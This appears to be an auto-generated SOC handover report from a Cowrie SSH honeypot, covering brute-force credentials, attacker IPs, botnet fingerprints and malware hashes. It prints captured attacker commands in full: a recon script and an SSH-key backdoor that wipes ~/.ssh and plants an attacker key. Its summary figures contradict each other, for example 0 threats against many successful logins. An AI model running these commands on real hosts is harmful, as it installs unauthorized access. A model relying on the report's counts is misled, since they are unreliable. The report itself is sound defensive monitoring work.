# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-10 |
| **Generated At** | 2026-08-10T22:43:13Z |
| **Shift Time** | 22:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **235** |
| Confirmed Threats | **0** |
| False Positives Filtered | **235** (100.0%) |
| Unique Attacker IPs | **89** |
| Countries of Origin | **0** |
| High Severity Cases | **109** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **126** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **126** |
| Unique Credential Pairs | **84** |
| Unique Usernames | **21** |
| Unique Passwords | **76** |
| Successful Auth Pairs | **114** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 62 |
| `support` | 18 |
| `admin` | 7 |
| `debian` | 6 |
| `345gs5662d34` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1q2w3e` | 6 |
| `admin` | 5 |
| `345gs5662d34` | 5 |
| `password321` | 5 |
| `123456a` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `support` | `1q2w3e` | 5 |
| `support` | `password321` | 5 |
| `support` | `123456a` | 4 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `321` | `193.32.162.84` | 2026-08-10T18:55:11 |
| `root` | `654321` | `193.32.162.84` | 2026-08-10T18:57:24 |
| `root` | `123` | `2.57.122.168` | 2026-08-10T18:57:49 |
| `support` | `123456a` | `10.0.0.73` | 2026-08-10T18:59:38 |
| `root` | `P@ssw0rd` | `193.32.162.84` | 2026-08-10T18:59:38 |
| `root` | `123123` | `2.57.122.168` | 2026-08-10T19:01:00 |
| `root` | `P@ssword` | `193.32.162.84` | 2026-08-10T19:02:07 |
| `admin` | `admin` | `8.136.128.232` | 2026-08-10T19:03:27 |
| `root` | `123321` | `2.57.122.168` | 2026-08-10T19:04:00 |
| `root` | `Root123` | `193.32.162.84` | 2026-08-10T19:04:25 |
| `operator` | `default` | `10.0.0.73` | 2026-08-10T19:05:38 |
| `root` | `admin` | `193.32.162.84` | 2026-08-10T19:06:40 |
| `root` | `1234` | `2.57.122.168` | 2026-08-10T19:07:02 |
| `root` | `admin123` | `193.32.162.84` | 2026-08-10T19:08:55 |
| `root` | `12345` | `2.57.122.168` | 2026-08-10T19:10:03 |
| `root` | `letmein` | `193.32.162.84` | 2026-08-10T19:11:13 |
| `root` | `pass` | `193.32.162.84` | 2026-08-10T19:13:40 |
| `root` | `1234567` | `2.57.122.168` | 2026-08-10T19:16:02 |
| `root` | `passw0rd` | `193.32.162.84` | 2026-08-10T19:16:31 |
| `support` | `123456a` | `213.55.79.195` | 2026-08-10T19:18:07 |
| `support` | `123456a` | `113.200.216.246` | 2026-08-10T19:18:19 |
| `dell` | `123` | `185.80.128.227` | 2026-08-10T19:18:20 |
| `345gs5662d34` | `345gs5662d34` | `185.80.128.227` | 2026-08-10T19:18:23 |
| `dell` | `3245gs5662d34` | `185.80.128.227` | 2026-08-10T19:18:24 |
| `support` | `123456a` | `196.189.124.229` | 2026-08-10T19:18:32 |
| `root` | `12345678` | `2.57.122.168` | 2026-08-10T19:19:00 |
| `root` | `password` | `193.32.162.84` | 2026-08-10T19:20:31 |
| `hadi` | `123456` | `91.232.247.229` | 2026-08-10T19:20:34 |
| `345gs5662d34` | `345gs5662d34` | `91.232.247.229` | 2026-08-10T19:20:36 |
| `hadi` | `3245gs5662d34` | `91.232.247.229` | 2026-08-10T19:20:37 |
| `root` | `123456789` | `2.57.122.168` | 2026-08-10T19:21:55 |
| `root` | `password1` | `193.32.162.84` | 2026-08-10T19:22:54 |
| `GET / HTTP/1.0` | `Host: 129.80.119.236` | `104.250.53.219` | 2026-08-10T19:23:05 |
| `USER test` | `USER test` | `104.250.53.219` | 2026-08-10T19:23:18 |
| `OPTIONS rtsp://129.80.119.236 RTSP/1.0` | `CSeq:1` | `104.250.53.219` | 2026-08-10T19:23:22 |
| `root` | `1234abcd` | `2.57.122.168` | 2026-08-10T19:24:31 |
| `root` | `qwerty` | `193.32.162.84` | 2026-08-10T19:25:07 |
| `support` | `support` | `10.0.0.73` | 2026-08-10T19:26:10 |
| `root` | `r00t` | `193.32.162.84` | 2026-08-10T19:27:21 |
| `root` | `123abc` | `2.57.122.168` | 2026-08-10T19:27:39 |
| `blank` | `Password` | `10.0.0.73` | 2026-08-10T19:28:14 |
| `root` | `123qwe` | `2.57.122.168` | 2026-08-10T19:30:21 |
| `root` | `root!@#` | `193.32.162.84` | 2026-08-10T19:31:50 |
| `root` | `1q2w3e` | `2.57.122.168` | 2026-08-10T19:33:05 |
| `debian` | `p@ssword` | `10.0.0.73` | 2026-08-10T19:33:42 |
| `root` | `root#123` | `193.32.162.84` | 2026-08-10T19:34:39 |
| `root` | `1q2w3e4r` | `2.57.122.168` | 2026-08-10T19:35:34 |
| `root` | `root0000` | `193.32.162.84` | 2026-08-10T19:38:32 |
| `debian` | `root` | `10.0.0.73` | 2026-08-10T19:39:42 |
| `root` | `root1111` | `193.32.162.84` | 2026-08-10T19:40:35 |
| `root` | `root123` | `193.32.162.84` | 2026-08-10T19:42:38 |
| `root` | `root1234` | `193.32.162.84` | 2026-08-10T19:44:41 |
| `blank` | `Password` | `112.26.101.76` | 2026-08-10T19:46:22 |
| `admin` | `admin` | `81.226.129.67` | 2026-08-10T19:46:30 |
| `blank` | `Password` | `109.233.21.109` | 2026-08-10T19:46:34 |
| `root` | `root2024` | `193.32.162.84` | 2026-08-10T19:46:52 |
| `root` | `root2222` | `193.32.162.84` | 2026-08-10T19:49:37 |
| `debian` | `p@ssword` | `121.189.226.81` | 2026-08-10T19:52:24 |
| `root` | `123@@@` | `165.1.75.106` | 2026-08-10T19:53:15 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-08-10T19:53:21 |
| `root` | `root321` | `193.32.162.84` | 2026-08-10T19:53:54 |
| `root` | `root4444` | `193.32.162.84` | 2026-08-10T19:56:13 |
| `debian` | `root` | `103.93.37.178` | 2026-08-10T19:57:04 |
| `debian` | `root` | `186.179.80.12` | 2026-08-10T19:57:17 |
| `root` | `root5555` | `193.32.162.84` | 2026-08-10T19:58:25 |
| `root` | `admin` | `192.42.116.98` | 2026-08-10T19:59:39 |
| `root` | `root5678` | `193.32.162.84` | 2026-08-10T20:00:37 |
| `support` | `1q2w3e` | `220.80.223.144` | 2026-08-10T20:02:16 |
| `support` | `1q2w3e` | `121.179.93.147` | 2026-08-10T20:02:29 |
| `root` | `root6666` | `193.32.162.84` | 2026-08-10T20:03:15 |
| `admin` | `asdasd` | `14.194.128.158` | 2026-08-10T20:04:07 |
| `support` | `support` | `176.53.159.196` | 2026-08-10T20:06:04 |
| `root` | `root9999` | `193.32.162.84` | 2026-08-10T20:06:48 |
| `root` | `root@123` | `193.32.162.84` | 2026-08-10T20:10:21 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `147.185.133.36` | 2026-08-10T20:10:49 |
| `root` | `rootaccess` | `193.32.162.84` | 2026-08-10T20:12:35 |
| `support` | `1q2w3e` | `10.0.0.73` | 2026-08-10T20:13:47 |
| `root` | `rootadmin` | `193.32.162.84` | 2026-08-10T20:14:56 |
| `root` | `rootme` | `193.32.162.84` | 2026-08-10T20:17:18 |
| `tunnel` | `tunnel` | `209.141.41.212` | 2026-08-10T20:19:20 |
| `345gs5662d34` | `345gs5662d34` | `209.141.41.212` | 2026-08-10T20:19:22 |
| `tunnel` | `3245gs5662d34` | `209.141.41.212` | 2026-08-10T20:19:22 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-10T20:19:41 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-10T20:19:41 |
| `root` | `rootpass` | `193.32.162.84` | 2026-08-10T20:20:06 |
| `admin` | `asdasd` | `103.103.53.44` | 2026-08-10T20:20:17 |
| `admin` | `asdasd` | `178.178.194.137` | 2026-08-10T20:20:30 |
| `user` | `112233` | `65.20.202.4` | 2026-08-10T20:26:16 |
| `user` | `112233` | `36.95.77.99` | 2026-08-10T20:26:27 |
| `support` | `1q2w3e` | `195.158.26.59` | 2026-08-10T20:31:07 |
| `admin` | `CalVxePV1!` | `94.154.43.237` | 2026-08-10T20:33:24 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-10T20:35:03 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-10T20:35:04 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-10T20:35:07 |
| `nobody` | `qwerty1234` | `59.8.50.83` | 2026-08-10T20:36:25 |
| `nobody` | `qwerty1234` | `50.188.204.213` | 2026-08-10T20:36:32 |
| `support` | `password321` | `10.0.0.73` | 2026-08-10T20:36:47 |
| `support` | `password321` | `65.20.237.119` | 2026-08-10T20:38:16 |
| `support` | `password321` | `220.246.42.212` | 2026-08-10T20:38:27 |
| `root` | `Abcd123456` | `77.90.185.20` | 2026-08-10T20:39:44 |
| `admin` | `admin` | `5.144.179.246` | 2026-08-10T20:40:24 |
| `ubnt` | `ubnt` | `5.144.179.246` | 2026-08-10T20:40:33 |
| `support` | `support` | `5.144.179.246` | 2026-08-10T20:40:36 |
| `RPM` | `RPM` | `5.144.179.246` | 2026-08-10T20:40:45 |
| `sshd` | `sshd` | `5.144.179.246` | 2026-08-10T20:40:51 |
| `monitor` | `monitor` | `5.144.179.246` | 2026-08-10T20:40:55 |
| `nobody` | `qwerty1234` | `10.0.0.73` | 2026-08-10T20:48:04 |
| `root` | `professor123` | `210.79.142.230` | 2026-08-10T20:48:58 |
| `345gs5662d34` | `345gs5662d34` | `210.79.142.230` | 2026-08-10T20:49:03 |
| `root` | `3245gs5662d34` | `210.79.142.230` | 2026-08-10T20:49:05 |
| `support` | `password321` | `60.223.250.50` | 2026-08-10T20:54:36 |
| `unity` | `unity` | `119.255.245.44` | 2026-08-10T20:54:44 |
| `support` | `password321` | `95.79.57.221` | 2026-08-10T20:54:48 |
| `345gs5662d34` | `345gs5662d34` | `119.255.245.44` | 2026-08-10T20:54:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **235** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 55 |
| libssh | 28 |
| OpenSSH | 25 |
| Paramiko (Python) | 8 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 48 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 23 |
| `f555226df196...` | Mirai/variant | 13 | 6 |
| `a2de0f306611...` | Mirai/variant | 8 | 3 |
| `63ae64767f33...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 48 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 23 | 23 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 6 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 8 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `63ae64767f33...` | libssh | 6 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 46 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `2.57.122.168`, `193.32.162.84`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.237`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `210.79.142.230`, `91.232.247.229`, `209.141.41.212`, `185.80.128.227`, `119.255.245.44`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **89** |
| Unique ASNs | **65** |
| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 4 | LOW |
| `AS22773` | Cox Communications Inc. | 4 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 4 | LOW |
| `AS396982` | Google LLC | 4 | LOW |
| `AS31898` | Oracle Corporation | 3 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 2 | LOW |
| `AS46562` | Performive LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 118 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 109 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 50 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 49 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 47 |

---

## 🔕 False Positive Summary (235 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 235 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 235 cases |
| Tool 34  | Credential Extractor        | ✅ 126 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 8 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 89 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 235 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 65 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

